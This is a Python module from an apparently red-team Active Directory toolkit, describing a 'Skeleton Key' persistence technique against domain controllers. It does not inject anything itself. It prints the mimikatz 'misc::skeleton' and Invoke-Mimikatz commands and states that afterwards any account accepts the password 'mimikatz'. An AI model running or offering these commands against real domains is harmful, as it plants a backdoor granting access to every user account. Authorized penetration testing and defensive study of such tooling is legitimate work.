"""Skeleton Key — inject master password into LSASS on the DC."""

from __future__ import annotations

import sys
from typing import Any

from adxpl.core.credential import ADCredential


MANIFEST = {
    "capability_id": "adxpl.persistence.skeleton_key.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["lsass_memory_modification", "domain_controller_persistence"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1556.001"],
}


def run(args: Any) -> int:
    cred = ADCredential.from_args(args)

    if not cred.has_password and not cred.has_hash:
        print("[!] Skeleton Key requires DA credentials", file=sys.stderr)
        return 1

    print(f"[*] Skeleton Key → {args.target} ({args.domain})")
    print("[!] WARNING: This injects a master password into LSASS memory on the DC")
    print("[!] The effect is lost on DC reboot")

    try:
        from impacket.dcerpc.v5 import transport, lsad, lsat
    except ImportError:
        print("[!] impacket not installed", file=sys.stderr)
        return 1

    print("[*] Skeleton Key injection requires direct LSASS memory access")
    print("[*] Use mimikatz: misc::skeleton on the DC")
    print("[*] Or: Invoke-Mimikatz -Command '\"misc::skeleton\"'")
    print("[*] After injection, any user authenticates with password 'mimikatz'")
    print("[*] This module provides guidance — direct injection requires local DC access")
    return 0
